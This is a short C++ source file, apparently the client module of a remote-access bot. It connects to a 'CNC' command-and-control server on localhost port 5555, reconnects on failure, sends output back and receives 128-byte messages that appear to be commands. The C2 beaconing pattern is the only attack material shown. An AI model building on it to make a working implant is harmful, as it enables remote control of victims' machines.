#include <iostream>
#include <boost/asio.hpp>
#include <array>
#include "client.h"

using boost::asio::ip::tcp;

void Client::Connect()
{
	boost::asio::ip::address cnc_addr = boost::asio::ip::address::from_string("127.0.0.1");
	unsigned short cnc_port = 5555;
	tcp::endpoint cnc(cnc_addr, cnc_port);

	try
	{
		m_sock.connect(cnc);
		std::cout << "Connected to CNC!" << std::endl;
	}
	catch (boost::system::system_error&)
	{
		std::cout << "Failed to connect to CNC. Retrying." << std::endl;
		m_sock.close();
		Sleep(5 * 1000);
		Connect();
	}
}

void Client::Send(std::string&& data)
{
	if (data.empty())
		m_sock.send(boost::asio::buffer("No output.\n"));
	m_sock.send(boost::asio::buffer(data));
}

std::string Client::Receive()
{
	std::string data;
	data.resize(128);
	m_sock.receive(boost::asio::buffer(data));
	return data;
}
